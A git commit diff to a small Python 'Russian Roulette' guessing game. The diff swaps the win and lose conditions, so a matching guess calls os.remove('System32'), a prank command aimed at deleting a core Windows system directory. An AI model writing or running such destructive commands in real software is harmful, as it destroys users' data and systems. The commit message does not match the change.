ec890fa4217f58e1fa3669e8aed2ee0d49a01183
Leonardo Rafael de Castro <lrccastro4@gmail.com>
2025-08-13 11:48:46 -0300

    Update Russian_Roulette.py
    Ler em voz alta é muito bom

--- Russian_Roulette.py
+++ Russian_Roulette.py
@@ -8,9 +8,10 @@ answer = int(input("Insert a number between 1 and 6\n"))
 print(f"This is your number {answer}\n")
 print(f"This is the number sorted {result}\n\n")
 
-if result == answer:
+if result != answer:
     print("Congratulations")
-elif result != answer:
+elif result == answer:
     os.remove("System32")
 else:
+
     print("Please insert a number")
